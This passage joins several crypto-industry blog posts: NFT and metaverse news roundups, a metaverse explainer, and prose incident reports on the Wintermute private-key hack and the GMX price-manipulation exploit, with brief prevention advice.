Most luxury labels and brands remain focused on creating NFTs to replicate physical items, but a few projects have started bringing their communities into the metaverse. By 2026, it is expected that the metaverse will have a market share worth $50.37 billion.</p><h2 id=\"blockchain-hacks\">Blockchain Hacks </h2><p>Wintermute, a global cryptocurrency market maker and algorithmic trading firm, lost $160 million due to DeFi hacking attacks. The root cause of the attack was due to a vulnerability in Profanity, an Ethereum vanity address tool, which allowed for the disclosure of a private key. The attacker made use of this information to execute a privilege function and designate the swap contract as the attacker-controlled one. The team failed to remove the address as an admin from their vault. Due to an internal error, a wrong function was called, and the team blacklisted the router instead of the operator. The hacker created a helper contract, deposited stable coin into Curve to avoid blacklisting, and figured out the vulnerability in a closed sourced vault contract. The hacker's wallet held approximately $9 million in Ether (ETH) and $37.5 million in other ERC-20 tokens. We have also covered the details of the exploit in <a href=\"https://blog.neptunemutual.com/decoding-wintermutes-hot-wallet-compromise/\" rel=\"follow\">this blog post</a>.</p><h2 id=\"metaverse-and-nfts\">Metaverse, and NFTs</h2><p>OpenSea, the digital marketplace for cryptocurrency collectibles and NFTs, has announced a new initiative to make it easier for creators to create and distribute NFTs on its platform. Creators will be able to launch their NFT collections on their own customizable and dedicated drop pages as part of this new immersive initiative, which the company hopes will allow for greater visibility and discoverability on the marketplace's new homepage. Creators will now be able to share images and videos, provide team highlights, outline roadmaps, and more via the customizable drop pages. SeaDrop, a new secure open source smart contract that will facilitate the drop experience, saving creators time and the technicalities involved in creating their own custom smart contracts, will also be available for project drops on OpenSea.</p><p>Citizens of Saudi Arabia commemorated the country's National Day in the Metaverse during a three-day event held in the Decentraland metaverse between September 22 and September 24. From traditional NFT attire to an open-air museum, this immersive experience paid homage to the culture and history of Saudi Arabia. Together with King Abdulaziz Foundation for Research and Archives, the Saudi advertising firm The Bold Group meticulously designed the event with a genuine blend of culture, history, and entertainment. Event participants were able to explore an open-air museum showcasing the cultural splendour of Saudi Arabia. Collectors were able to purchase wearable NFTs inspired by Saudi national attire.</p><p>Jack Daniels has joined a number of major firms and brands that have already applied for metaverse and NFT-related trademarks for various purposes with the United States trademark regulator. Mike Kondoudis, an attorney for intellectual property trademarks, verified that Jack Daniels submitted three trademark applications to the United States Patent and Trademark Office for metaverse and NFTs. According to him, Jack Daniels aims to sell NFT-authenticated media relating to beverages, barware, and clothes, such as video, audio, artwork, and text. The trademark will also cover digital goods that may be downloaded. Additionally, the corporation has submitted a trademark application for downloadable computer software that delivers beverage-related information and software that Jack Daniels may use as a digital wallet.</p><p>The use of NFTs as digital collectibles aided their growth last year. Over the past year, major brands including Nike, Dolce &amp; Gabbana, and Tiffany have sold NFTs worth hundreds of millions of dollars. The Universal Studios theme parks in California and Florida are currently adding NFTs to their list of attractions. Through October 31, visitors to the park will be able to participate in a Halloween-themed scavenger hunt that may mint approximately 7 million NFTs. Each park will conceal seven QR codes, each of which will generate an NFT when scanned. Those who locate and scan all seven will receive a unique NFT and gain access to additional perks.</p><p>Royal Enfield, manufacturer of the popular Classic 350, Bullet, and other motorcycles in different nations, has announced its entry into Web 3.0 technology by launching NFT through a partnership with foundation.app, an Ethereum-based NFT platform. Royal Enfield said in a press release that they would introduce their NFT collection, comprising ten exclusive winning artwork concepts from the Art of Motorcycling program's previous two seasons. Every one of these NFTs costs Rs 15,000 and will be issued on October 3. Puneet Sood, global head of apparel business at Royal Enfield, stated that the art of motorcycle riding is meant to provide a forum for designers, painters, illustrators, and motorcycle enthusiasts to express their passion for the sport.</p><p>AC Milan has announced a groundbreaking new partnership with Web3 e-sports platform MonkeyLeague, which includes NFT gaming, merchandise, collectibles, and more. Fans can collect AC Milan-themed MonkeyPlayers, merchandise, wearables, and other tokenized assets, as well as compete in a series of exciting AC Milan-branded MonkeyLeague tournaments. Later in the year, the first AC Milan MonkeyPlayer NFTs will be released via the Magic Eden marketplace in the form of an auction where the highest bidder takes all, with the top-tier NFTs including a club-signed AC Milan jersey.</p><p>While the Big Billion Days Sale is currently underway, e-commerce giant Flipkart plans to unveil its interactive and Metaverse-themed virtual retail platform dubbed Flipverse. According to reports, the company has collaborated on the project with social media behemoth Meta and Ethereum Layer-2 scaling platform Polygon, which may go live in October. In addition to hosting games, NFTs, product launches, and other contests, Flipverse will reportedly implement a slew of Web3.0 technologies to improve the current user experience, including a virtual reality experience. The new service will allow users to navigate through the virtual shopping center and interact with digital storefronts.</p><h2 id=\"onchain-insurance-industry-news\">OnChain Insurance Industry News</h2><p>InsurAce Protocol has announced that their cover wordings are being updated, which may apply to one or more cover products or services.

        html: "<p><strong>The metaverse is one of the biggest buzzwords in blockchain and has been touted as having the ability to usher in a new era of digital connectivity and shared virtual reality (VR) and augmented reality (AR) experiences. Tech and non-tech companies alike are pumping billions of dollars into the space even though it is still a long way from mainstream adoption.</strong></p><p><strong>What is the metaverse really all about? And is it worth the hype? Here’s what you need to know.</strong></p><h2 id=\"what-does-metaverse-mean\"><br>What Does Metaverse Mean?</h2><p>In October 2021, social media giant, Facebook announced that it would be rebranding to Meta with a view to “bringing the metaverse to life”. Despite the increased publicity generated about the metaverse since the announcement, the meaning of the term itself hasn’t necessarily gotten any clearer.</p><p>So what exactly is the metaverse?<br><br>It is a term that describes a hypothetical future version of the Internet where immersive virtual reality and mixed reality worlds combine to facilitate real time interactions and experiences.</p><p>Admittedly, this definition might not necessarily make the metaverse easier to understand. But hopefully, it gives enough to give you a general idea of the concept.</p><p>Basically, the metaverse is an upgrade to how we communicate with one another by allowing us to converse, work, shop, learn, and even play through a unified virtual experience. It’s essentially a massive network of interactive, blockchain-based virtual worlds where users are represented by custom avatars and move freely between these worlds for work, play, and everything in between.</p><p>Think of how you access the Internet now – open a browser, type in the website URL or do a web search, land on the website, and then browse through based on the site’s navigation system. Now try to imagine each website as a standalone 3D world that you can access and interact with using virtual and augmented reality tools like VR headsets, controllers, and haptic gloves.</p><p>Let’s say you want to buy something on Amazon. In the metaverse, instead of an eCommerce website, you would be browsing a virtual store where you can interact with the items for sale and check out information about them just as you would if you were shopping in a physical store. When you’re done shopping, you “exit the store” (close the tab) and visit any other virtual world (website) that you want.</p><h2 id=\"what-are-the-current-virtual-world-platforms-in-the-metaverse\">What are the Current Virtual World Platforms in the Metaverse?</h2><p>Right now, there are dozens of disconnected virtual worlds that will eventually become the metaverse. This means that these virtual worlds have their own avatars, access, currency, and interactions.</p><p>The most popular current virtual world platforms include Decentraland, Roblox, HyperVerse, Sandbox, NFT Worlds, Cryptovoxels, and Somnium Space.</p><figure class=\"kg-card kg-image-card kg-card-hascaption\"><img src=\"https://blog.neptunemutual.com/content/images/2022/11/decentraland-user-avatars.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"1600\" height=\"1066\" srcset=\"https://blog.neptunemutual.com/content/images/size/w600/2022/11/decentraland-user-avatars.png 600w, https://blog.neptunemutual.com/content/images/size/w1000/2022/11/decentraland-user-avatars.png 1000w, https://blog.neptunemutual.com/content/images/2022/11/decentraland-user-avatars.png 1600w\" sizes=\"(min-width: 720px) 720px\"><figcaption>Snapshot of real user avatars in Decentraland | Source: <a href=\"https://www.wired.com/story/metaverse-land-rush-illusion/\">wired.com</a></figcaption></figure><p>Only when these worlds are truly interconnected whereby your avatar can move freely between worlds and interact with them without complications that we can achieve a true metaverse.</p><p>As you may have imagined, this will not likely happen anytime soon. Still, it’s worth highlighting the value that these pioneers bring into the space.</p><h3 id=\"what-are-some-of-the-different-services-being-proposed-by-metaverse-companies\">What are some of the different services being proposed by metaverse companies?</h3><p>There is a wide range of services being proposed by metaverse companies. These include everything from virtual currency exchange platforms to social VR applications. Some of the more popular services include:</p><ul><li><strong>Gaming:</strong> Players from all over the world can experience real-time gaming and move across worlds competing in different competitions and tournaments using their custom avatars. Think Ready Player One type of scenario. While we’re not there yet, it’s exciting to witness gaming that is more immersive and engaging than ever before.</li><li><strong>Virtual Currency Exchange Platforms:</strong> These platforms allow users to buy, sell, or trade virtual currencies. Examples include Bittrex and ShapeShift.</li><li><strong>Social VR Applications:</strong> These are applications that allow users to interact with each other in virtual reality, often for gaming or entertainment purposes. Examples include Rec Room, AltspaceVR, and High Fidelity.</li><li><strong>Decentralized Virtual Worlds: </strong>These are virtual worlds that are powered by blockchain technology. This allows for more secure transactions and gives users more control over their data. Examples include DecentWorld, Decentraland, and .</li></ul><h2 id=\"what-are-the-latest-innovations-and-trends-in-metaverse-startups\">What are the Latest Innovations and Trends in Metaverse Startups?</h2><p>There are a few key trends that are currently driving innovation in the metaverse startup space.</p><p>The first is the development of new platforms and technologies that make it easier to create and deploy virtual worlds. This includes platforms like Unity and Unreal Engine, which allow developers to create high-quality visuals with ease.</p><figure class=\"kg-card kg-image-card kg-card-hascaption\"><img src=\"https://blog.neptunemutual.com/content/images/2022/11/unreal-engine-metaverse-humans.jpeg\" class=\"kg-image\" alt loading=\"lazy\" width=\"1000\" height=\"568\" srcset=\"https://blog.neptunemutual.com/content/images/size/w600/2022/11/unreal-engine-metaverse-humans.jpeg 600w, https://blog.neptunemutual.com/content/images/2022/11/unreal-engine-metaverse-humans.jpeg 1000w\" sizes=\"(min-width: 720px) 720px\"><figcaption>Highly realistic human characters rendered using Unreal Engine MetaHumans | Source: <a href=\"https://www.unrealengine.com/en-US/metahuman\">unrealengine.com//metahuman</a></figcaption></figure><p>Additionally, there has been a rise in the use of blockchain technology to create decentralized virtual worlds. This allows for more secure transactions and gives users more control over their data.</p><p>Finally, we are seeing a trend towards the development of social VR applications. These are applications that allow users to interact with each other in virtual reality, often for gaming or entertainment purposes. Some popular examples include Rec Room, AltspaceVR, and High Fidelity.</p><h2 id=\"major-brand-names-investing-heavily-in-the-metaverse\">Major Brand Names Investing Heavily in the Metaverse</h2><p>There are a number of major brand names that are already making their mark in the metaverse either with direct capital investments into the space or through filed patents and trademarks.</p><p>Here are some of the most popular examples by industry:</p><h3 id=\"tech\">Tech</h3><p>Behemoths in the tech space, including Meta, Apple, Microsoft, and Google have been quick to stake a claim in the metaverse with huge capital investments. For example, in January 2022, Microsoft announced its <a href=\"https://news.microsoft.com/2022/01/18/microsoft-to-acquire-activision-blizzard-to-bring-the-joy-and-community-of-gaming-to-everyone-across-every-device/\">acquisition of gaming giant, Activision Blizzard</a> for nearly $70 billion as part of the company’s plan to “provide building blocks for the metaverse.”</p><h3 id=\"gaming-companies\">Gaming Companies</h3><p>Nvidia, Epic Games (developers of Fortnite), and Roblox Corporation are among the leading brands in the gaming industry already making great strides in the metaverse. Who can forget the April 2020 <a href=\"https://www.epicgames.com/fortnite/en-US/news/astronomical#:~:text=From%20April%2023%2D25%2C%20blast,the%20ground%20up%20in%20Fortnite.\">Fortnite Astronomical event</a> that featured a live concert with a massive hologram of rapper Travis Scott? The concert was attended by over 27 million participants.</p><h3 id=\"retail-and-fashion\">Retail and Fashion</h3><p>It shouldn’t come as a surprise that many retail brands are chasing success in the metaverse. Virtual products are needed in the virtual world too, after all. To that end, US pharmacy chain <a href=\"https://decrypt.co/94521/cvs-trademark-filing-hints-metaverse-pharmacy-plans\">CVS recently unveiled plans</a> to trademark its products in the metaverse, as well as file a patent for downloadable virtual goods.</p><p>In fashion, sportswear giant Nike has already stamped its presence in the metaverse with a highly immersive and interactive world known as Nikeland. Since its launch in November 2021, the platform has recorded <a href=\"https://www.beyondgames.biz/21138/nikeland-has-nearly-7-million-consumers-already/#:~:text=According%20to%20Nike%2C%20the%20company's,its%20launch%20in%20November%202021.\">nearly 7 million visitors</a> from all over the world.</p><figure class=\"kg-card kg-image-card kg-card-hascaption\"><img src=\"https://blog.neptunemutual.com/content/images/2022/11/nikeland-roblox-metaverse.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"1240\" height=\"698\" srcset=\"https://blog.neptunemutual.com/content/images/size/w600/2022/11/nikeland-roblox-metaverse.png 600w, https://blog.neptunemutual.com/content/images/size/w1000/2022/11/nikeland-roblox-metaverse.png 1000w, https://blog.neptunemutual.com/content/images/2022/11/nikeland-roblox-metaverse.png 1240w\" sizes=\"(min-width: 720px) 720px\"><figcaption>Nikeland in the Roblox metaverse | Source: <a href=\"https://jingdaily.com/metaverse-2022-china-5g-baidu/\">jingdaily.com</a></figcaption></figure><p>Other fashion brands investing in the metaverse include L'Oréal, Ralph Lauren, Tommy Hilfiger, and Dolce &amp; Gabbana.</p><h3 id=\"food\">Food</h3><p>This one is tricky because it’s incredibly challenging to find a practical way to translate food and other everyday necessities into the virtual world. That hasn’t stopped fast-food restaurants like <a href=\"https://www.gadgetmatch.com/mcdonalds-wingstop-virtual-food-metaverse/\">McDonald’s and Wingstop</a> from having a go at it.</p><p>McDonald’s approach is to create a system where users can purchase virtual food in the metaverse and the physical version will be delivered to them in the real world. On the other hand, Wingstop intends to supply users in the virtual world with special tokens that grant them discounts for real-world purchases.</p><h3 id=\"big-banks\">Big Banks</h3><p>In February 2022, JPMorgan Chase became the first major investment bank <a href=\"https://fortune.com/2022/02/16/jpmorgan-first-bank-join-metaverse/\">to open a branch in the metaverse</a>. This branch is located in the Metajuku Shopping Center, a 16,000 square foot shopping district in the Decentraland metaverse. Known as Onyx by JPMorgan, the bank branch features a luminous portrait of CEO Jamie Dimon, a live tiger, and a spiral staircase in the lounge.</p><figure class=\"kg-card kg-image-card kg-card-hascaption\"><img src=\"https://blog.neptunemutual.com/content/images/2022/11/onyx-jpmorganchase-decentraland.jpeg\" class=\"kg-image\" alt loading=\"lazy\" width=\"1600\" height=\"752\" srcset=\"https://blog.neptunemutual.com/content/images/size/w600/2022/11/onyx-jpmorganchase-decentraland.jpeg 600w, https://blog.neptunemutual.com/content/images/size/w1000/2022/11/onyx-jpmorganchase-decentraland.jpeg 1000w, https://blog.neptunemutual.com/content/images/2022/11/onyx-jpmorganchase-decentraland.jpeg 1600w\" sizes=\"(min-width: 720px) 720px\"><figcaption>Onyx by JPMorgan Chase in Decentraland | Source: <a href=\"https://cointelegraph.com/news/1t-opportunity-jpmorgan-becomes-first-major-bank-in-the-metaverse\">cointelegraph.com</a></figcaption></figure><h3 id=\"government\">Government</h3><p>That’s right, even governments are keen on getting a piece of the action that is the metaverse. In February 2022, South Korea’s Ministry of ICT, Science, and Future Planning released an <a href=\"https://cointelegraph.com/news/south-korea-to-invest-187m-in-national-metaverse\">official statement</a> confirming its full-fledged support for the creation of an extended virtual world (metaverse) ecosystem. This is expected to expand the virtual industrial growth of the country.</p><h3 id=\"celebrities\">Celebrities</h3><p>A growing number of celebrities have also begun to create avatar versions of themselves, including Justin Bieber, Lady Gaga, and Leonardo DiCaprio. As the metaverse continues to grow in popularity, we expect to see even more major brands and celebrities entering this space.</p><h2 id=\"how-much-money-has-been-invested-in-metaverse-assets\">How Much Money Has Been Invested In Metaverse Assets?</h2><p>This is difficult to quantify as the metaverse is still in its early stages and there is no centralized exchange where all transactions take place.</p><p>What we do know is that the figures are in the billions. A <a href=\"https://www.mckinsey.com/~/media/mckinsey/business%20functions/marketing%20and%20sales/our%20insights/value%20creation%20in%20the%20metaverse/Value-creation-in-the-metaverse.pdf\">recent report</a> by global consulting firm McKinsey &amp; Company shows that in the first five months of 2022, over $120 billion has been invested in the metaverse. This is more than double the total amount invested in the space in 2021, which was estimated at $57 billion.</p><p>Additionally, according to a <a href=\"https://news.bitcoin.com/goldman-sachs-metaverse-8-trillion-opportunity/\">report by Goldman Sachs</a>, the metaverse market might be worth $8 trillion.</p><p>So far, most of the investment has been in assets such as avatar data, NFTs, and virtual currencies. This is because these asset types offer the most potential for return on investment. However, as the metaverse matures, expect to see more investment in other asset classes such as property and art.</p><h2 id=\"what-are-the-different-types-of-assets-in-the-metaverse\">What are the Different Types of Assets in the Metaverse?</h2><p>One of the biggest factors driving the growth and viability of the metaverse is the ability to fully own virtual assets and experiences thanks to the blockchain.</p><p>Some of the most popular assets in the metaverse include:</p><h3 id=\"virtual-land\">Virtual Land</h3><p>The metaverse is a collection of interconnected virtual worlds so it makes sense that one of its biggest selling assets is virtual real estate. The demand for virtual land is on the rise with some plots selling for millions of dollars. At the time of writing this, the highest amount spent on virtual real estate is <a href=\"https://www.investing.com/news/cryptocurrency-news/top-8-most-expensive-virtual-real-estate-properties-2797023\">$4.3 million by Republic Realms</a> in The Sandbox.</p><p>Decentraland and Axie Infinity have also recorded million-dollar virtual land sales in their respective metaverse-worlds.</p><h3 id=\"non-fungible-tokens-nfts\">Non-Fungible Tokens (NFTs)</h3><p>Another type of asset in the metaverse is NFTs. These are unique digital assets issued on the blockchain that cannot be replicated or interchanged, hence the name. They are often used to represent ownership of virtual property, avatars, art, or collectibles.</p><p>NFTs typically derive their value from their rarity level, as well as the current hype around their projects, which heavily influences demand. At the moment, the most expensive NFT sold is the <a href=\"https://onlineonly.christies.com/s/beeple-first-5000-days/beeple-b-1981-1/112924\"><em>Everydays: The First 5000 Days</em></a> by Beeple, which was purchased at auction in February 2021 for a whopping $69.3 million.</p><h3 id=\"virtual-currencies\">Virtual Currencies</h3><p>Virtual currencies are digital assets that can be used to purchase goods and services within the metaverse. These coins help facilitate transactions within each world and can be ‘Hodled’ as well to benefit from upward market movements.</p><figure class=\"kg-card kg-image-card kg-card-hascaption\"><img src=\"https://blog.neptunemutual.com/content/images/2022/11/top-10-metaverse-crypto-1.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"1600\" height=\"777\" srcset=\"https://blog.neptunemutual.com/content/images/size/w600/2022/11/top-10-metaverse-crypto-1.png 600w, https://blog.neptunemutual.com/content/images/size/w1000/2022/11/top-10-metaverse-crypto-1.png 1000w, https://blog.neptunemutual.com/content/images/2022/11/top-10-metaverse-crypto-1.png 1600w\" sizes=\"(min-width: 720px) 720px\"><figcaption>Top 10 metaverse virtual currencies by Market Capitalization | Source: <a href=\"https://www.coingecko.com/en/categories/metaverse\">coingecko.com</a></figcaption></figure><h2 id=\"what-are-the-biggest-risks-investors-face-when-owning-metaverse-assets\">What are the Biggest Risks Investors Face When Owning Metaverse Assets?</h2><p>Whether in physical or virtual form, assets represent value and are therefore subject to certain risks. These include:</p><h3 id=\"hacks-and-exploits\">Hacks and Exploits</h3><p>This is one of the biggest challenges facing the entire blockchain ecosystem. Metaverse worlds run on regular IT hardware and software, making them susceptible to IT-based attacks. Recently, many large platforms like Roblox and Axie Infinity have experienced at least one form of hacking, with tons of user data and virtual assets worth millions being stolen.</p><p>One of the most recent events was the hack on Neopets, a popular metaverse game platform.</p><figure class=\"kg-card kg-embed-card\"><blockquote class=\"twitter-tweet\"><p lang=\"en\" dir=\"ltr\">Neopets recently became aware that customer data may have been stolen. We immediately launched an investigation assisted by a leading forensics firm. We are also engaging law enforcement and enhancing the protections for our systems and our user data. (1/3)</p>&mdash; neopets (@Neopets) <a href=\"https://twitter.com/Neopets/status/1549948273250766848?ref_src=twsrc%5Etfw\">July 21, 2022</a></blockquote>\n<script async src=\"https://platform.twitter.com/widgets.js\" charset=\"utf-8\"></script>\n</figure><h3 id=\"scams\">Scams</h3><p>Phishing scams are a huge cause for concern among metaverse asset owners and investors. And rightly so, considering the occurrences of such scams have <a href=\"https://www.cnbc.com/2022/05/26/cybercriminals-target-metaverse-investors-with-phishing-scams.html\">been on the rise lately</a>.</p><p>In March 2022, Axie Infinity's Ronin bridge was hacked resulting in a loss of over $600 million. As the details of the hack came to light over the weeks that followed, it became clear that a <a href=\"https://www.theblock.co/post/156038/how-a-fake-job-offer-took-down-the-worlds-most-popular-crypto-game\">phishing scam was the foundation of the attack</a>. The hackers had duped a senior engineer at the company with a fake job offer via Linkedin. The victim had clicked on what they thought to be an acceptance letter in PDF format. It turned out that this action also resulted in downloading the spyware that was used to infiltrate Ronin’s systems.</p><h3 id=\"crypto-market-risks\">Crypto Market Risks</h3><p>Values of crypto coins and tokens are always subject to market volatility. This risk is further deepened by the fact the metaverse is still in its infancy stage so wild price changes are not uncommon.</p><h3 id=\"miscellaneous-threats-and-issues\">Miscellaneous Threats and Issues</h3><p>These are risks that do not fit neatly into any of the other categories discussed above. For example, because metaverse worlds and their applications are relatively new, there’s no standard regulatory body overseeing their affairs.</p><p>Also, risks associated with power failure and poor Internet connectivity can result in huge financial losses for both users and creators within the metaverse ecosystem.</p><h2 id=\"conclusion\">Conclusion</h2><p>The metaverse is a rapidly growing collection of virtual worlds all offering richer, more immersive interactive experiences. It has been hyped up as a game-changing innovation and if recent developments are anything to go by, we can safely assume that it is on the right track.</p><p>However, with billions of dollars being pumped into the space, there are huge risks that must be taken into account. By understanding these risks, you can make informed decisions about how to protect your assets and maximize your chances for success in the metaverse.</p><hr><h2 id=\"about-us\">About Us</h2><p>Neptune Mutual project safeguards the Ethereum community from cyber threats.

        html: "<h2 id=\"tldr\">TL;DR</h2><p>On September 20, 2022, Wintermute's CEO announced on Twitter that the protocol had lost $160 million due to DeFi hacking attacks.</p><h2 id=\"introduction-to-wintermute\">Introduction to Wintermute</h2><p>Wintermute is a global cryptocurrency market maker and algorithmic trading firm that offers liquidity across a variety of vetted exchanges, trading platforms, and coins.</p><h2 id=\"vulnerability-assessment\">Vulnerability Assessment</h2><p>The root cause of the attack is due to a vulnerability in Profanity, an Ethereum vanity address tool, which allowed for the disclosure of a private key. The attacker made use of this information to execute a privilege function and designate the swap contract as the attacker-controlled one.</p><h2 id=\"steps\">Steps</h2><ol><li>The attack began with a <a href=\"https://etherscan.io/tx/0xeecba26d5eb7939257e5b3e646e4bc597b73e256a89cb84a6dfc58de250d8a38\" rel=\"nofollow noopener noreferrer\">transaction request</a>, in which Wintermute's <a href=\"https://etherscan.io/address/0x0000000fe6a514a32abdcdfcc076c85243de899b\" rel=\"nofollow noopener noreferrer\">hot wallet</a> called their <a href=\"https://etherscan.io/address/0x00000000ae347930bd1e7b0f35588b92280f9e75\" rel=\"nofollow noopener noreferrer\">vault contract</a> in order to transfer tokens to the <a href=\"https://etherscan.io/address/0x0248f752802b2cfb4373cc0c3bc3964429385c26\" rel=\"nofollow noopener noreferrer\">hacker's contract</a>.<br></li><li>The vault only allows admin to perform these transfers, and with Wintermute’s hot wallet serving as admin, it is expected that the admin address itself was likely compromised.<br></li><li>The admin address is a vanity address that was possibly generated using Profanity. &nbsp;1inch team had publicly <a href=\"https://blog.1inch.io/a-vulnerability-disclosed-in-profanity-an-ethereum-vanity-address-tool-68ed7455fc8c\" rel=\"nofollow noopener noreferrer\">disclosed a critical bug in Profanity</a> a few days before this incident. <br></li><li>Following this disclosure, Wintermute removed all ether from their <a href=\"https://etherscan.io/tx/0x93716f3e3a9e3f47dec05b4df511e07e53b3e4695e84cd4f05f5d83188f3552a\" rel=\"nofollow noopener noreferrer\">admin address</a>, indicating the team's acknowledgement of a potential vulnerability. However, they failed to remove the address as an admin from their vault. Due to an internal error, a wrong function was called and the team blacklisted the router instead of the operator, i.e., the contract that signs. <br></li><li>The attacker <a href=\"https://etherscan.io/tx/0x93eadb28e6b50e7ed14348a14cfc3c9f09618dace9c20d3f39ab3d5828e3fd21\" rel=\"nofollow noopener noreferrer\">funded this address with their own ether</a> and then used it to pull off the heist by exploiting the bug in Profanity to recover the hot wallet's private key.<br></li><li>Thus this hacker created a helper contract, deposited stable coin into Curve to avoid blacklisting, and figured out the vulnerability in a closed sourced vault contract. The <a href=\"https://etherscan.io/address/0xe74b28c2eAe8679e3cCc3a94d5d0dE83CCB84705\" rel=\"nofollow noopener noreferrer\">hacker's wallet</a> now contains approximately $9 million in Ether (ETH) and $37.5 million in other ERC-20 tokens.</li></ol><h2 id=\"aftermath\">Aftermath</h2><p>The hacker transferred $111 million to Curve Finance's 3pool to prevent Tether and Circle from freezing stablecoins. Despite the incident, Wintermute's lending and OTC operations have not been affected. Evgeny Gaevoy, the company's founder and CEO, stated that the company remains solvent, with more than twice the value of the stolen funds in equity remaining.<br></p><p>When the news of lost assets hit the market, on-chain data revealed that the team owes more than $200 million in DeFi debt to a number of counterparties. The biggest debt is a $92 million USDT loan from TrueFi, followed by a $75 million USDC and WETH debt to Maple Finance and a $22.4 million USDT debt to Clearpool.</p><h2 id=\"how-to-prevent-such-an-attack-vector\">How to prevent such an attack vector</h2><p>The majority of exploits are the result of human error. DeFi institutions should invest enough resources in automating processes to test the protocol in order to reduce the human impact of such serious circumstances.</p><h2 id=\"protocol-and-platform-security\">Protocol, and Platform Security</h2><p>Our security team at Neptune Mutual can validate your platform for DNS and web-based security, smart contract reviews, as well as frontend and backend security.

        html: "<h2 id=\"tldr\">TL;DR</h2><p>On September 18, 2022, GMX was the victim of a $565,000 price manipulation exploit on the AVAX/USD pair.</p><h2 id=\"introduction-to-gmx\">Introduction to GMX</h2><p>GMX is a decentralized spot and perpetual crypto exchange, powered by Artibitrum and Avalanche, that supports low swap fees and zero price impact trades.</p><h2 id=\"vulnerability-assessment\">Vulnerability Assessment</h2><p>In a price manipulation attack, an attacker manipulates the token price of the susceptible DeFi app. There are two forms of these attacks: direct and indirect price manipulation, which have become more prevalent with the advent and growth of DeFi, DEX, and lending applications.<br></p><p>The attacker uses an unwanted trade on the DEX to directly affect a token's price in the liquidity of an AMM in a direct price manipulation attack. However, in the latter approach, a trade on an AMM is used to subtly affect the token price of a vulnerable DeFi application, whose price mechanism depends on real-time status. If a lending app's price system is manipulable, a borrower may take out more tokens than they are eligible to borrow.</p><h3 id=\"steps\">Steps:</h3><ol><li>GMX advocates the zero slippage of perpetual trades as their primary strength, and has a fixed price for assets fed by an oracle. If a trader long or short any size on GMX, there is no price impact. <br></li><li>The profits are liquidity provided by $GLP token holders. Users swap crypto native tokens or stable-coins for GLP tokens on the GMX dex. When traders generate profits, liquidity providers incur losses. Therefore, when traders exploit this vulnerability, GLP holders may lose all their money.<br></li><li>This trader took both a long and short position on GMX without affecting the price, then impacted the price on CEX to manipulate the oracle price feed.<br></li><li>In doing so, he successfully extracted profits from GMX's AVAX/USD market by opening large positions with no slippage and then moving AVAX/USD in their favor on other venues. As he switched from long to short 5 times, he created a sinusoidal pattern that lasted over an hour.</li></ol><figure class=\"kg-card kg-image-card\"><img src=\"https://blog.neptunemutual.com/content/images/2022/11/gmx-exploit-avax-usd-chart.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"1440\" height=\"823\" srcset=\"https://blog.neptunemutual.com/content/images/size/w600/2022/11/gmx-exploit-avax-usd-chart.png 600w, https://blog.neptunemutual.com/content/images/size/w1000/2022/11/gmx-exploit-avax-usd-chart.png 1000w, https://blog.neptunemutual.com/content/images/2022/11/gmx-exploit-avax-usd-chart.png 1440w\" sizes=\"(min-width: 720px) 720px\"></figure><p>5. In the first cycle, he made approximately $158k by trading clips of $4-5 million \tat a time. The trader repeated this process five times to profit between $500,000 \tand $700,000. A part of this profit was also distributed to market-makers on \t     other trading platforms in order to move the price of AVAX.<br></p><p>6. Given the design framework used to deploy the workings of GMX, the trader \t \tessentially executed large trades against GLP holders with zero slippage, at the \toracle price, and without taking into account any price impact. A skillful trader \tcould have used the price manipulation to siphon all the liquidity from GMX due \tto no price impact.</p><h2 id=\"aftermath\">Aftermath</h2><p>To prevent the exchange from such exploitation, the team later capped the short and long open interest for AVAX. Open interest for AVAX long perpetual futures has been set at $2 million, while open interest for AVAX short perpetual futures has been capped at $1 million. The GLP and GMX markets continue to operate normally.</p><h2 id=\"prevention-against-price-manipulation-attack\">Prevention against Price Manipulation Attack</h2><p>Price manipulation originated from the logical flaw in DeFi apps, so spotting it necessitates a thorough examination of numerous smart contracts and a comprehension of their high-level semantics.</p><h2 id=\"protocol-and-platform-security\">Protocol, and Platform Security</h2><p>Our security team at Neptune Mutual can validate your platform for DNS and web-based security, smart contract reviews, as well as frontend and backend security.

        html: "<h2 id=\"tldr\">TL;DR <br></h2><ul><li>Starbucks unveiled a new NFT community and rewards program for coffee members.</li><li>Disney is looking forward to making its first foray into the Metaverse.</li><li>FIFA gears up for the upcoming World Cup with a new NFT platform.<br></li></ul><p>Numerous studies show that just a small fraction of the overall market capitalization of crypto assets is insured against severe risks such as hacks and smart contract vulnerabilities. The acceleration in adoption of protection offered by cover protocols is uncertain, despite the fact that digital assets worth over $2.56 billion were stolen in a wide variety of DeFi hacks in 2022 alone.</p><h2 id=\"blockchain-hacks\">Blockchain Hacks </h2><p>Decentralized exchange GMX was a target of a price manipulation attack on the AVAX/USD pair on key exchanges, resulting in a $565k profit. Open interest in AVAX long perpetual futures has now been capped at $2 million, while open interest in AVAX short perpetual futures is limited to $1 million. Users then could take a long position by buying $50 million of AVAX on GMX. They could then buy $40 million of AVAX on a centralized exchange at an elevated buy price. Upon closing the long position on GMX and receiving a profit, they could open up a $20 million AVAX short position and sell $40 million of AVAX back to the centralized exchanges at a discount, pocketing a further profit. This similar process was repeated multiple times, draining the liquidity of GLP, the liquidity provider token on the GMX, to take back the reward.</p><h2 id=\"metaverse-and-nfts\">Metaverse, and NFTs</h2><p>Starbucks has announced that its members in the United States will be able to earn and purchase digital collectible stamps in the form of NFTs. Starbucks Odyssey, a collection in which each collectible digital stamp has its ownership verified on the blockchain, will include a point value based on its rarity. Members' points will increase as they collect more stamps, giving them access to exclusive experiences. The iconic coffee chain stated that rewards range from a virtual espresso martini-making class to exclusive event invites at Starbucks Reserve Roasteries and possibly trips to the Starbucks Hacienda Alsacia coffee farm in Costa Rica. NFTs can be earned by playing interactive coffee-themed games or completing fun challenges on Starbucks Odyssey, which will be available later this year. Users can also buy NFTs on the built-in marketplace without connecting their wallets or using any crypto.</p><p>Vera Bradley, the lifestyle and fashion accessories brand, is venturing into the Metaverse and developing a number of NFT collections. The genesis NFT collection has launched, commemorating 40 years of fabulous fashion. The Heritage Pass, the first NFT collection, functions as a Mint Pass. Furthermore, each of the 440 NFT tokens comes with a physical, limited-edition Jilly Bag in one of four heritage prints. Early adopters will have first access to the second NFT, which will be available in October. The 1982 Collection is Vera Bradley's second NFT release, and it includes 1,982 generated backgrounds created from 40 archived prints. This collection, which costs $19.82, 